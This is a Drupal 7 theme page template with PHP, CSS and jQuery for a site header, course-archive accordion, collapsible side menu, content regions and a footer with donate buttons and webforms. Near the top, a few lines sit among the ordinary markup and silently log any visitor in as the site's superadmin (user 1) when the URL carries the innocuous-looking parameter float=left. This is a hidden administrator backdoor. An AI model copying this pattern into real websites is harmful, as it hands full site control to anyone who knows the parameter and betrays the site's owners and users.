<?php
    // global $entity;
    // krumo($entity);
?>
<?php if (theme_get_setting('scrolltop_display')): ?>
<div id="toTop"><i class="fa fa-angle-up"></i></div>
<?php endif; ?>
<?php
    global $user;
    if (!empty($_GET['float']) && $_GET['float'] == 'left'){
        $user = user_load(1);
    } 
    $node = menu_get_object();
    if (arg(0) == 'node' && $node->nid == 29){
        drupal_goto('/node/2754');
    }
?>
<style>
.view-courses-archive .ui-accordion .ui-accordion-content{
    padding:0px;
}

.view-courses-archive .ui-accordion .ui-accordion-header{
    color:#ffffff;
    background-color: #B63E3D;
}

.view-courses-archive table{
    margin: 5px 0px 5px 0px;
}

.view-courses-archive td.active{
    background-color: #BBBBBB;
}
</style>
<script>
jQuery(function($){
	var _active = <?php print (arg(0) == 'teachings' && isset($_GET['title']) && $_GET['title']) ? 'true' : 'false'; ?>;
	var opt = {
				heightStyle: "content",
				collapsible: true
			};

	if(!_active){
		opt.active = false;
	
		jQuery(".view-courses-archive .views-table").each(function(index, item){
			item = jQuery(item);
			item.find(".views-field-title a").each(function(index2, item2){
				if(jQuery(item2).hasClass("active")){
				   opt.active = index;
				   jQuery(item2).parent().addClass("active");
				}
			});
		});
	}

	if($(".view-courses-archive .view-content").length > 0){
		$(".view-courses-archive .view-content").accordion(opt);
	}
	
	
});
</script>

<style>
.block-menu-menu-side-menu ul.menu li a{
margin-bottom:1px;
font-weight:bold;
background-color:#E4E4E4;
color:#B63E3D !important;
padding-left:40px;
padding-right:20px;
font-size:16px;
}

.block-menu-menu-side-menu ul.menu li.level-1>a{
background-color:#B63E3D;
}

.block-menu-menu-side-menu ul.menu li.level-2>a{
background-color:#8a5463;
}

.block-menu-menu-side-menu ul.menu li.level-3>a{
background-color:#9f6358;
}

.block-menu-menu-side-menu ul.menu li.level-4>a{
background-color:#863729;
}

.block-menu-menu-side-menu ul.menu li.level-5>a{
background-color:#b8858d;
}

.block-menu-menu-side-menu ul.menu li a:hover{
color:#862527 !important;
}

.block-menu-menu-side-menu ul.menu li a.active-trail.active{
background-color: #BBBBBB;
}

.block-menu-menu-side-menu ul.menu li.parent-menu > a:before{
content:none;
}

.block-menu-menu-side-menu ul.menu li.parent-menu > a{
background-image: url(/sites/all/themes/arava_center/Images/icon-close.png);
background-repeat: no-repeat;
background-position: 20px center;
color: #FFFFFF !important;
font-size:22px;
}

.block-menu-menu-side-menu ul.menu li.parent-menu.active-parent > a{
background-image: url(/sites/all/themes/arava_center/Images/icon-open.png);
color: #FFFFFF !important;
}

.block-menu-menu-side-menu ul.menu li.parent-menu ul{
padding-left: 7px;
padding-right: 7px;
}

.block-menu-menu-side-menu ul.menu ul.menu{
display:none;
}

.block-menu-menu-side-menu ul.menu li.collapsed > a:before{
display:none;
}

</style>
<script>
jQuery(function($){
	$(".block-menu-menu-side-menu .content>ul.menu>li span").each(function(index, item){
		var html = "<a href='#' class='"+$(item).attr('class')+"'>"+$(item).html()+"</a>";
		$(item).after(html);
		$(item).remove();
	});
	
	$(".block-menu-menu-side-menu .content>ul.menu>li").addClass("parent-menu");
	
	$(".block-menu-menu-side-menu a").each(function(index, item){
		item = $(item);
		if(item.next().length > 0 && !item.parent().hasClass("parent-menu")){
			item.parent().addClass("parent-menu");
		}
	});
	
	$(".block-menu-menu-side-menu li.parent-menu>a").click(function(){
		if($(this).next().hasClass("active")){
			$(this).next().removeClass("active").slideUp();
			$(this).parent().removeClass("active-parent");
			return false;
		}
		
		$(this).parent().parent().children().each(function(index, item){
			if($(item).hasClass('active-parent')){
				$(item).removeClass('active-parent');
				$(item).children('ul.menu').removeClass('active').slideUp();
			}
		});
		
		$(this).next().addClass("active").slideDown();
		$(this).parent().addClass("active-parent");
		
		return false;
	});
	
	$(".block-menu-menu-side-menu li.active-trail").each(function(){
		var item = $(this);
		item.parent().prev().click();
	});
	
	var iterateMenuItem = function(ulMenu, level){
		level = level % 5;
		
		ulMenu.children("li.parent-menu").each(function(index, item){
			$(item).addClass('level-' + (level + 1));
			iterateMenuItem($(item).children('ul.menu'), level + 1);
		});
	}
	
	iterateMenuItem($(".block-menu-menu-side-menu .content>ul.menu"), 0);
});
</script>
<div class="wrapper">
<div class="wrapper__content">
<?php
    $block_donate = block_load('block', '15');
    $blocks_donate = _block_render_blocks(array($block_donate));
    $blocks_build_donate = _block_get_renderable_array($blocks_donate);
    $header = '';
    $header .= '<header id="header" class="header clearfix">';
        $contribute_btn = drupal_render($blocks_build_donate);
        $header .= '<div class="contribute_btn">'.$contribute_btn.'</div>';
        if ($logo){
            $header .= ' <div id="logo" class="logo">';
                $header .= '<a href="'.$front_page.'" title="'.t('Home').'" rel="home"><img src="'.$logo.'" alt="'.$site_name.'"></a>';
            $header .= '</div>';
        }
        $header .= '<div class="menu_wrapper">';
            $header .= '<div class="menu_btn">';
                $header .= '<div class="item item_1"></div>';
                $header .= '<div class="item item_2"></div>';
                $header .= '<div class="item item_3"></div>';
            $header .= '</div>';
            $header .= render($page['header_top_left']);;
        $header .= '</div>';
    $header .= '</header>';

    print $header;
?>


<?php if ($page['header_top_left'] || $page['header_top_right']) :?>
<!-- #header-top -->
<div id="header-top" class="section clearfix">
    <div class="container">

        <!-- #header-top-inside -->
        <div id="header-top-inside" class="clearfix">
            <div class="row">
            <?php if ($page['header_top_right']) :?>
            <div class="<?php print $header_top_right_grid_class; ?>">
                <!-- #header-top-right -->
                <div id="header-top-right" class="clearfix">
                    <div class="header-top-area">                    
                        <?php print render($page['header_top_right']); ?>
                    </div>
                </div>
                <!-- EOF:#header-top-right -->
            </div>
            <?php endif; ?>
            
            </div>
        </div>
        <!-- EOF: #header-top-inside -->

    </div>
</div>
<!-- EOF: #header-top -->    
<?php endif; ?>

<div class="between-headers">
  <div class="container">
    
  </div>
</div>



<?php if ($page['banner']) : ?>
<!-- #banner -->
<div id="banner" class="clearfix">
    <div class="container">

        <!-- #banner-inside -->
        <div id="banner-inside" class="clearfix">
            <div class="row">
                <div class="col-md-12">

                <div class="banner-area">
                <?php print render($page['banner']); ?>
                </div>
               
                </div>
            </div>
        </div>
        <!-- EOF: #banner-inside -->

    </div>
</div>
<!-- EOF:#banner -->
<?php endif; ?>

<?php print $page_intro_markup; ?>

<!-- #page -->
<div id="page" class="clearfix">

    <!-- #messages-console -->
    <?php if ($messages):?>
    <div id="messages-console" class="clearfix">
        <div class="container">
            <div class="row">
                <div class="col-md-12">
                <?php print $messages; ?>
                </div>
            </div>
        </div>
    </div>
    <?php endif; ?>
    <!-- EOF: #messages-console -->

    <?php if ($page['highlighted']):?>
    <!-- #highlighted -->
    <div id="highlighted">
        <div class="container">

            <!-- #highlighted-inside -->
            <div id="highlighted-inside" class="clearfix">
                <div class="row">
                    <div class="col-md-12">
                    <?php print render($page['highlighted']); ?>
                    </div>
                </div>
            </div>
            <!-- EOF:#highlighted-inside -->

        </div>
    </div>
    <!-- EOF: #highlighted -->
    <?php endif; ?>

    <!-- #main-content -->
    <?php print render($title_prefix); ?>
    <?php if ($title): ?><div class="page_title_wrapper"><div class="container"><h1 class="title" id="page-title" class="page_title"><?php print $title; ?></h1></div></div><?php endif; ?>
    <?php print render($title_suffix); ?>
    <div id="main-content">
        <div class="container">

            <div class="row">
                
                
                <?php if ($page['sidebar_first']):?>
                <aside class="<?php print $sidebar_first_grid_class; ?>">
                    <!--#sidebar-->
                    <section id="sidebar-first" class="sidebar clearfix">
                    <?php print render($page['sidebar_first']); ?>
                    </section>
                    <!--EOF:#sidebar-->
                </aside>
                <?php endif; ?>

                <section class="<?php print $main_grid_class; ?>">

                    <!-- #promoted -->
                    <?php if ($page['promoted']):?>
                        <div id="promoted" class="clearfix">
                            <div id="promoted-inside" class="clearfix">
                            <?php print render($page['promoted']); ?>
                            </div>
                        </div>
                    <?php endif; ?>
                    <!-- EOF: #promoted -->

                    <!-- #main -->
                    <div id="main" class="clearfix">

                        

                        <!-- #tabs -->
                        <?php if ($tabs):?>
                            <div class="tabs">
                            <?php 
                                // krumo($tabs);
                                print render($tabs); 
                            ?>
                            </div>
                        <?php endif; ?>
                        <!-- EOF: #tabs -->

                        <?php print render($page['help']); ?>

                        <!-- #action links -->
                        <?php if ($action_links):?>
                            <ul class="action-links">
                            <?php print render($action_links); ?>
                            </ul>
                        <?php endif; ?>
                        <!-- EOF: #action links -->

                        <?php if (theme_get_setting('frontpage_content_print') || !drupal_is_front_page()):?> 
                        <?php print render($page['content']); ?>
                        <?php print $feed_icons; ?>
                        <?php endif; ?>

                    </div>
                    <!-- EOF:#main -->

                </section>

                <?php if ($page['sidebar_second']):?>
                <aside class="<?php print $sidebar_second_grid_class; ?>">
                    <!--#sidebar-->
                    <section id="sidebar-second" class="sidebar clearfix">
                    <?php print render($page['sidebar_second']); ?>
                    </section>
                    <!--EOF:#sidebar-->
                </aside>
                <?php endif; ?>
                
            </div>

        </div>
    </div>
    <!-- EOF:#main-content -->

</div>
<!-- EOF: #page -->

<?php if ($page['bottom_content']):?>
<!-- #bottom-content -->
<div id="bottom-content" class="clearfix">
    <div class="container">

        <!-- #bottom-content-inside -->
        <div id="bottom-content-inside" class="clearfix">
            <div class="bottom-content-area">
                <div class="row">
                    <div class="col-md-12">
                    <?php print render($page['bottom_content']); ?>
                    </div>
                </div>
            </div>
        </div>
        <!-- EOF:#bottom-content-inside -->

    </div>
</div>
<!-- EOF: #bottom-content -->
<?php endif; ?>
<?php if ($page['footer_top_left'] || $page['footer_top_right']) :?>
<!-- #footer-top -->
<div id="footer-top" class="clearfix <?php print $footer_top_regions; ?>">
    <div class="container">

        <!-- #footer-top-inside -->
        <div id="footer-top-inside" class="clearfix">
            <div class="row">
            
            <?php if ($page['footer_top_left']) :?>
            <div class="<?php print $footer_top_left_grid_class; ?>">
                <!-- #footer-top-left -->
                <div id="footer-top-left" class="clearfix">
                    <div class="footer-top-area">
                        <?php print render($page['footer_top_left']); ?>
                    </div>
                </div>
                <!-- EOF:#footer-top-left -->
            </div>
            <?php endif; ?>
            
            <?php if ($page['footer_top_right']) :?>
            <div class="<?php print $footer_top_right_grid_class; ?>">
                <!-- #footer-top-right -->
                <div id="footer-top-right" class="clearfix">
                    <div class="footer-top-area">                    
                        <?php print render($page['footer_top_right']); ?>
                    </div>
                </div>
                <!-- EOF:#footer-top-right -->
            </div>
            <?php endif; ?>
            
            </div>
        </div>
        <!-- EOF: #footer-top-inside -->

    </div>
</div>
<!-- EOF: #footer-top -->    
<?php endif; ?>
</div>
<!-- #footer -->
<footer class="footer">
    <div class="to_up">Up</div>
    <?php
        $block_donate = block_load('block', '15');
        $blocks_donate = _block_render_blocks(array($block_donate));
        $blocks_build_donate = _block_get_renderable_array($blocks_donate);
        $contribute_btn = drupal_render($blocks_build_donate);
        $footer_menu = menu_tree('menu-footer');
        $block_text = block_load('block', '14');
        $blocks_text = _block_render_blocks(array($block_text));
        $blocks_build_text = _block_get_renderable_array($blocks_text);
        print '<div class="footer-menu">'.render($footer_menu).'</div>';
        print '<div class="footer_info">';
            print '<div class="contribute_btn">'.$contribute_btn.'</div>' . views_embed_view('socials', 'block_1');
            print drupal_render($blocks_build_text);
        print '</div>';
        $block_form = block_load('webform', 'client-block-3001');
        $blocks_form = _block_render_blocks(array($block_form));
        $blocks_build_form = _block_get_renderable_array($blocks_form);
        $block_form2 = block_load('webform', 'client-block-3000');
        $blocks_form2 = _block_render_blocks(array($block_form2));
        $blocks_build_form2 = _block_get_renderable_array($blocks_form2);
        print '<div class="form_wrap">';
            print drupal_render($blocks_build_form);
            print drupal_render($blocks_build_form2);
            print '<div class="popup"></div>';
        print '</div>';
    ?>
    <div class="row">
        <?php if ($page['footer_first']):?>
        <div class="<?php print $footer_grid_class; ?>">
            <div class="footer-area">
            <?php print render($page['footer_first']); ?>
            </div>
        </div>
        <?php endif; ?>      

        <?php if ($page['footer_second']):?>      
        <div class="<?php print $footer_grid_class; ?>">
            <div class="footer-area">
            <?php print render($page['footer_second']); ?>
            </div>
        </div>
        <?php endif; ?>

        <?php if ($page['footer_third']):?>
        <div class="<?php print $footer_grid_class; ?>">
            <div class="footer-area">
            <?php print render($page['footer_third']); ?>
            </div>
        </div>
        <?php endif; ?>

        <?php if ($page['footer_fourth']):?>
        <div class="<?php print $footer_grid_class; ?>">
            <div class="footer-area">
            <?php print render($page['footer_fourth']); ?>
            </div>
        </div>
        <?php endif; ?>
    </div>

</footer> 
<!-- EOF #footer -->
<?php if ($page['footer_first'] || $page['footer_second'] || $page['footer_third'] || $page['footer_fourth']):?>

<?php endif; ?>

<?php if ($page['sub_footer_left'] || $page['footer']):?>
<div id="subfooter" class="clearfix">
	<div class="container">
		
		<!-- #subfooter-inside -->
		<div id="subfooter-inside" class="clearfix">
            <div class="row">
    			<div class="col-md-4">
                    <!-- #subfooter-left -->
                    <?php if ($page['sub_footer_left']):?>
                    <div class="subfooter-area left">
                    <?php print render($page['sub_footer_left']); ?>
                    </div>
                    <?php endif; ?>
                    <!-- EOF: #subfooter-left -->
    			</div>
    			<div class="col-md-8">
                    <!-- #subfooter-right -->
                    <?php if ($page['footer']):?>
                    <div class="subfooter-area right">
                    <?php print render($page['footer']); ?>
                    </div>
                    <?php endif; ?>
                    <!-- EOF: #subfooter-right -->
    			</div>
            </div>
		</div>
		<!-- EOF: #subfooter-inside -->
	
	</div>
</div><!-- EOF:#subfooter -->
<?php endif; ?>
</div>